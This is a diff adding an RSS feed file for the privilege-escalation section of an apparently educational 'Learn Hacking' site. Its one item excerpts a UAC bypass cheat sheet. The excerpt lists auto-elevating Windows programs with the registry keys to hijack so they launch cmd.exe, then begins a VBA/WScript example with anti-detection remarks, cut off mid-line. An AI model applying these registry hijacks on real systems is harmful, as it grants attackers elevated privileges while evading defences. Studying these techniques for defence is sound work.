@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on Learn Hacking</title>
+    <link>https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on Learn Hacking</description>
+    <generator>Hugo -- gohugo.io</generator><atom:link href="https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>UAC Bypass</title>
+      <link>https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/uac/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://brimstone.github.io/learn-hacking/docs/windows/privilege-escalation/uac/</guid>
+      <description>UAC Bypass #  Vulnerable programs #  CompMgmtLauncher.exe #  eventvwr.exe #   Windows 7/8/10 HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command = &amp;quot;cmd.exe&amp;quot;  sdclt.exe #   Windows 10 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe = &amp;quot;cmd.exe&amp;quot;  fodhelper.exe #   Windows 10 HKCU\Software\Classes\ms-settings\shell\open\command = &amp;quot;DelegateExecute&amp;quot; HKCU\Software\Classes\ms-settings\shell\open\command = &amp;quot;cmd.exe&amp;quot;  Examples #  WScript Example &#39; Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506 &#39; Sleep is caught (may use ping instead?) &#39; Obfusc may be needed Private Declare Sub Sleep Lib &amp;quot;kernel32&amp;quot; (ByVal dwMilliseconds As Long) Private Sub CommandButton1_Click() Set WSobj = CreateObject(&amp;quot;WScript.</description>
+    </item>
+    
+  </channel>
+</rss>
